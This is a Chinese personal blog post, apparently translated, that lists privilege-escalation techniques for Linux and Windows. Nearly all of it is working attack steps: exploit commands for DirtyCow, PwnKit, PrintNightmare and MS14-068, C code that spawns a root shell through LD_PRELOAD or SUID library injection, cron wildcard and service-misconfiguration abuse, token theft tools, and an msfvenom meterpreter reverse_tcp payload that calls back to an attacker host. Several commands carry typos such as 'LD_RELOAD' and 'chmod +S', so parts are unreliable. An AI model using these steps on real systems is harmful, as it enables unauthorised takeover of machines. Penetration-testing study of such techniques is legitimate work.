<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta name="description" content="本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>117种提权手法 |  n0rt6&#39;s blog</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.jpg" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <!--浏览器搞笑标题-->
<script type="text/javascript" src="\js\FunnyTitle.js"></script>
<!--点击爱心-->
<script type="text/javascript" src="\js\clickLove.js"></script>
  <div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-117种提权手法"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  117种提权手法
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/11/17/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/" class="article-date">
  <time datetime="2023-11-17T12:44:12.000Z" itemprop="datePublished">2023-11-17</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">6.2k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">32 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="什么是网络安全中的权限提升？"><a href="#什么是网络安全中的权限提升？" class="headerlink" title="什么是网络安全中的权限提升？"></a>什么是网络安全中的权限提升？</h1><p>在网络安全领域，了解威胁至关重要，而最关键的威胁之一就是特权升级的概念。从本质上讲，权限升级是指攻击者获得通常为高级用户保留的系统权限或功能的情况。</p>
<p>主要有两种类型：垂直升级和水平升级。在垂直升级中，具有较低级别权限的攻击者将其权限提升到较高级别用户（通常是管理员）的权限。这使得他们能够访问受限区域、修改系统配置，甚至部署恶意软件。另一方面，横向升级涉及访问属于对等用户的资源或功能，并利用类似特权帐户的权限。</p>
<p>特权升级的危险是显而易见的。通过提升权限，攻击者可以绕过网络安全措施，从而损害数据完整性、机密性和系统可用性。对于组织而言，这可能会导致数据泄露、系统停机以及潜在的法律和声誉后果。识别权限升级的迹象并部署预防性网络安全措施对于保护数字资产并确保只有授权人员才能访问关键系统功能至关重要。</p>
<p>鉴于网络安全不断发展的形势，对特权升级等威胁保持警惕至关重要。它强调了不断更新安全协议、监控系统活动以及确保正确分配和定期审核用户角色和权限的重要性。这样做，组织可以减轻与未经授权的访问相关的风险，并保持对潜在网络对手的强大防御。</p>
<p>现在我们已经熟悉了这个概念，我们将继续研究这个提权概念的117种方法：</p>
<h1 id="117种提权手法"><a href="#117种提权手法" class="headerlink" title="117种提权手法"></a>117种提权手法</h1><h3 id="DirtyC0w"><a href="#DirtyC0w" class="headerlink" title="DirtyC0w"></a>DirtyC0w</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: <code>gcc -pthread c0w.c -o c0w; ./c0w; passwd; id</code></p>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p>
<h3 id="CVE-2016-1531"><a href="#CVE-2016-1531" class="headerlink" title="CVE-2016-1531"></a>CVE-2016-1531</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: <code>CVE-2016-1531.sh;id</code></p>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/crypticdante/CVE-2016-1531">https://github.com/crypticdante/CVE-2016-1531</a></p>
<h3 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法:</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;secnigma&#x2F;CVE-2021-3560-Polkit-Privilege-Esclation
.&#x2F;2. poc.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="DirtyPipe"><a href="#DirtyPipe" class="headerlink" title="DirtyPipe"></a>DirtyPipe</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>./traitor-amd64 –exploit kernel:CVE-2022-0847</code></li>
<li><code>Whoami;id</code></li>
</ol>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/liamg/traitor/releases/tag/v0.0.14">https://github.com/liamg/traitor/releases/tag/v0.0.14</a></p>
<h3 id="PwnKit"><a href="#PwnKit" class="headerlink" title="PwnKit"></a>PwnKit</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>./cve-2021-4034</code></li>
<li><code>Whoami;id</code></li>
</ol>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
<h3 id="ms14-058"><a href="#ms14-058" class="headerlink" title="ms14_058"></a>ms14_058</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ul>
<li><code>msf &gt; use exploit/windows/local/ms14_058_track_popup_menu</code></li>
<li><code>msf exploit(ms14_058_track_popup_menu) &gt; set TARGET &lt; target-id &gt;</code></li>
<li><code>msf exploit(ms14_058_track_popup_menu) &gt; exploit</code></li>
</ul>
<h3 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li>命令提示符下: <code>powershell.exe -nop -ep bypass</code></li>
<li>在Power Shell提示符类型输入: <code>Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1</code></li>
<li>在Power Shell提示符类型输入: <code>Invoke-Tater -Trigger 1 -Command “net localgroup administrators user /add”</code></li>
<li>要确认攻击是否成功，请在 Power Shell 提示符中键入: <code>net localgroup administrators</code></li>
</ol>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Tater">https://github.com/Kevin-Robertson/Tater</a></p>
<h3 id="Intel-SYSRET"><a href="#Intel-SYSRET" class="headerlink" title="Intel SYSRET"></a>Intel SYSRET</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>execute -H -f sysret.exe -a &quot;-pid [pid]&quot;</code></li>
</ol>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/jajp777/sysret">https://github.com/jajp777/sysret</a></p>
<p>release版本：<a target="_blank" rel="noopener" href="https://github.com/jajp777/sysret/tree/master/x64/Release">https://github.com/jajp777/sysret/tree/master/x64/Release</a></p>
<h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;outflanknl&#x2F;PrintNightmare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li><code>PrintNightmare 10.10.10.10 exp.dll</code></li>
</ol>
<h3 id="Folina"><a href="#Folina" class="headerlink" title="Folina"></a>Folina</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;JohnHammond&#x2F;msdt-follina<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li><code>python3 follina.py -c &quot;notepad&quot;</code></li>
</ol>
<h3 id="ALPC"><a href="#ALPC" class="headerlink" title="ALPC"></a>ALPC</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;riparino&#x2F;Task_Scheduler_ALPC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="RemotePotato0"><a href="#RemotePotato0" class="headerlink" title="RemotePotato0"></a>RemotePotato0</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>sudo ntlmrelayx.py -t ldap://10.0.0.10 –no-wcf-server –escalate-user normal_user</code></li>
<li><code>.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1</code></li>
</ol>
<p>批注：</p>
<p>ntlmrelayx.py只找到个很相似的：<a target="_blank" rel="noopener" href="https://github.com/LuemmelSec/ntlmrelayx.py_to_exe">https://github.com/LuemmelSec/ntlmrelayx.py_to_exe</a></p>
<p>remotepotato：<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2">https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2</a></p>
<h3 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>certipy req ‘lab.local/cve$:CVEPassword1234*@10.100.10.13’ -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA</code></li>
<li><code>Rubeus.exe asktgt /user:&quot;目标_sam名称&quot; /certificate:cert.pfx /password:&quot;CERTIFICATE_PASSWORD&quot; /domain:&quot;FQDN_域名&quot; /dc:&quot;域名_CONTROLLER&quot; /show</code></li>
</ol>
<p>批注：</p>
<p>rubeus：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc</code></li>
</ol>
<p>批注：</p>
<p>无py版本，exe版本：<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/MS14-068">https://github.com/ianxtianxt/MS14-068</a></p>
<h3 id="Sudo-LD-PRELOAD"><a href="#Sudo-LD-PRELOAD" class="headerlink" title="Sudo LD_PRELOAD"></a>Sudo LD_PRELOAD</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Injection</p>
<p>方法: </p>
<p>1. </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">unsetenv</span><span class="token punctuation">(</span>“LD_PRELOAD”<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span>“<span class="token operator">/</span>bin<span class="token operator">/</span>bash”<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><code>gcc -fPIC -shared -o /tmp/ldreload.so ldreload.c -nostartfiles</code></li>
<li><code>sudo LD_RELOAD=tmp/ldreload.so apache2</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-so-injection"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-so-injection" class="headerlink" title="Abusing File Permission via SUID Binaries – .so injection)"></a>Abusing File Permission via SUID Binaries – .so injection)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Injection</p>
<p>方法: </p>
<ol>
<li><code>mkdir /home/user/.config</code></li>
<li></li>
</ol>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> _attribute <span class="token function">_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

 <span class="token function">system</span><span class="token punctuation">(</span>“cp <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">&amp;&amp;</span> chmod <span class="token operator">+</span>s <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">&amp;&amp;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">-</span>p”<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><code>gcc -shared -o /home/user/.config/libcalc.so -fPIC/home/user/.config/libcalc.c</code></li>
<li><code>/usr/local/bin/suid-so</code></li>
</ol>
<p>​	<code>id</code></p>
<h3 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Injection</p>
<p>方法: </p>
<ol>
<li><code>RemoteDLLInjector64</code></li>
</ol>
<p>​		Or</p>
<p>​	<code>MemJect</code></p>
<p>​		Or</p>
<p>​	<code>https://github.com/tomcarver16/BOF-DLL-Inject</code></p>
<ol>
<li><code>#define PROCESS_NAME &quot;csgo.exe&quot;</code></li>
</ol>
<p>​		Or</p>
<p>​	<code>RemoteDLLInjector64.exe pid C:\runforpriv.dll</code></p>
<p>​		Or</p>
<p>​	<code>mandllinjection ./runforpriv.dll pid</code></p>
<p>批注：</p>
<p>remoteDllInjector：<a target="_blank" rel="noopener" href="https://github.com/Al1ex/RemoteDLLInjector">https://github.com/Al1ex/RemoteDLLInjector</a></p>
<p>memject：<a target="_blank" rel="noopener" href="https://github.com/danielkrupinski/MemJect">https://github.com/danielkrupinski/MemJect</a></p>
<h3 id="Early-Bird-Injection"><a href="#Early-Bird-Injection" class="headerlink" title="Early Bird Injection"></a>Early Bird Injection</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Injection</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">hollow svchost.exe pop.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：hollow链接<a target="_blank" rel="noopener" href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></p>
<h3 id="Process-Injection-through-Memory-Section"><a href="#Process-Injection-through-Memory-Section" class="headerlink" title="Process Injection through Memory Section"></a>Process Injection through Memory Section</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Injection</p>
<p>方法: </p>
<ol>
<li><code>sec-shinject PID /path/to/bin</code></li>
</ol>
<p>批注：未找到</p>
<h3 id="Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite"><a href="#Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite" class="headerlink" title="Abusing Scheduled Tasks via Cron Path Overwrite"></a>Abusing Scheduled Tasks via Cron Path Overwrite</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing Scheduled Tasks</p>
<p>方法: </p>
<ol>
<li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; systemupdate.sh;</code></li>
<li><code>chmod +x systemupdate.sh</code></li>
<li><code>等待一会儿</code></li>
<li><code>/tmp/bash -p</code></li>
<li><code>id &amp;&amp; whoami</code></li>
</ol>
<h3 id="Abusing-Scheduled-Tasks-via-Cron-Wildcards"><a href="#Abusing-Scheduled-Tasks-via-Cron-Wildcards" class="headerlink" title="Abusing Scheduled Tasks via Cron Wildcards"></a>Abusing Scheduled Tasks via Cron Wildcards</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing Scheduled Tasks</p>
<p>方法: </p>
<ol>
<li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; /home/user/systemupdate.sh;</code></li>
<li><code>touch /home/user/ –checkpoint=1;</code></li>
<li><code>touch /home/user/ –checkpoint-action=exec=sh\systemupdate.sh</code></li>
<li><code>等待一会儿</code></li>
<li><code>/tmp/bash -p</code></li>
<li><code>id &amp;&amp; whoami</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Symlink"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Symlink" class="headerlink" title="Abusing File Permission via SUID Binaries – Symlink)"></a>Abusing File Permission via SUID Binaries – Symlink)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing File Permission</p>
<p>方法: </p>
<ol>
<li><code>su – www-data;</code></li>
<li><code>nginxed-root.sh /var/log/nginx/error.log;</code></li>
<li>In root user</li>
<li><code>invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-1"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-1" class="headerlink" title="Abusing File Permission via SUID Binaries – Environment Variables #1)"></a>Abusing File Permission via SUID Binaries – Environment Variables #1)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing File Permission</p>
<p>方法: </p>
<ol>
<li><code>echo &#39;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#39; &gt;/tmp/service.c;</code></li>
<li><code>gcc /tmp/services.c -o /tmp/service;</code></li>
<li><code>export PATH=/tmp:$PATH;</code></li>
<li><code>/usr/local/bin/sudi-env; id</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-2"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-2" class="headerlink" title="Abusing File Permission via SUID Binaries – Environment Variables #2)"></a>Abusing File Permission via SUID Binaries – Environment Variables #2)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing File Permission</p>
<p>方法: </p>
<ol>
<li><code>env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +S /tmp/bash)&#39; /bin/sh -c /usr/local/bin/suid-env2; set +x; /tmp/bash -p</code></li>
</ol>
<h3 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>Windows_dll.c: cmd.exe /k net localgroup administrators user /add</code></li>
<li><code>x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll</code></li>
<li><code>sc stop dllsvc &amp; sc start dllsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-binPath"><a href="#Abusing-Services-via-binPath" class="headerlink" title="Abusing Services via binPath"></a>Abusing Services via binPath</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>sc config daclsvc binpath= &quot;net localgroup administrators user /add&quot;</code></li>
<li><code>sc start daclsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Unquoted-Path"><a href="#Abusing-Services-via-Unquoted-Path" class="headerlink" title="Abusing Services via Unquoted Path"></a>Abusing Services via Unquoted Path</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>msfvenom -p windows/exec CMD=’net localgroup administrators user /add’ -f exe-service -o common.exe</code></li>
<li><code>common.exe 放在 &#39;C:\Program Files\Unquoted Path Service&#39;.</code></li>
<li><code>sc start unquotedsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Registry"><a href="#Abusing-Services-via-Registry" class="headerlink" title="Abusing Services via Registry"></a>Abusing Services via Registry</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t</code></li>
<li><code>REG_EXPAND_SZ /d c:\temp\x.exe /f</code></li>
<li><code>sc start regsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Executable-File"><a href="#Abusing-Services-via-Executable-File" class="headerlink" title="Abusing Services via Executable File"></a>Abusing Services via Executable File</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>copy /y c:\Temp\x.exe &quot;c:\Program Files\File Permissions Service\filepermservice.exe&quot;</code></li>
<li><code>sc start filepermsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Autorun"><a href="#Abusing-Services-via-Autorun" class="headerlink" title="Abusing Services via Autorun"></a>Abusing Services via Autorun</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) 类型： <code>use multi/handler</code></p>
<p>In Metasploit (msf &gt; prompt) 类型： <code>set payload windows/meterpreter/reverse_tcp</code></p>
<p>In Metasploit (msf &gt; prompt) 类型： <code>set lhost [Kali VM IP Address]</code></p>
<p>In Metasploit (msf &gt; prompt) 类型： <code>run</code></p>
<p>打开另一个命令提示符并键入:</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;[Kali VM IP Address] -f exe -o program.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">program.exe 放在 &#39;C:\Program Files\Autorun Program&#39;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-Services-via-AlwaysInstallElevated"><a href="#Abusing-Services-via-AlwaysInstallElevated" class="headerlink" title="Abusing Services via AlwaysInstallElevated"></a>Abusing Services via AlwaysInstallElevated</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;exec CMD&#x3D;&#39;net localgroup administrators user &#x2F;add&#39; -f msi-nouac -o setup.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\Temp\setup.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：sharpup链接<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p>
<h3 id="Abusing-Services-via-SeCreateToken"><a href="#Abusing-Services-via-SeCreateToken" class="headerlink" title="Abusing Services via SeCreateToken"></a>Abusing Services via SeCreateToken</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">!rmpriv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-Services-via-SeDebug"><a href="#Abusing-Services-via-SeDebug" class="headerlink" title="Abusing Services via SeDebug"></a>Abusing Services via SeDebug</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Conjure-LSASS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">syscall_enable_priv 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Remote-Process-via-Syscalls-HellsGate-Hal操作系统Gate"><a href="#Remote-Process-via-Syscalls-HellsGate-Hal操作系统Gate" class="headerlink" title="Remote Process via Syscalls (HellsGate|Hal操作系统Gate)"></a>Remote Process via Syscalls (HellsGate|Hal操作系统Gate)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">injectEtwBypass pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/boku7/injectEtwBypass">https://github.com/boku7/injectEtwBypass</a></p>
<h3 id="Escalate-With-DuplicateTokenEx"><a href="#Escalate-With-DuplicateTokenEx" class="headerlink" title="Escalate With DuplicateTokenEx"></a>Escalate With DuplicateTokenEx</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型: Abuse Privilege</p>
<p>方法: </p>
<pre class="line-numbers language-none"><code class="language-none">PrimaryTokenTheft.exe pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">TokenPlaye.exe –impersonate –pid pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：</p>
<p>primarytokenthenft：<a target="_blank" rel="noopener" href="https://github.com/slyd0g/PrimaryTokenTheft">https://github.com/slyd0g/PrimaryTokenTheft</a></p>
<p>tokenplaye：<a target="_blank" rel="noopener" href="https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8">https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8</a></p>
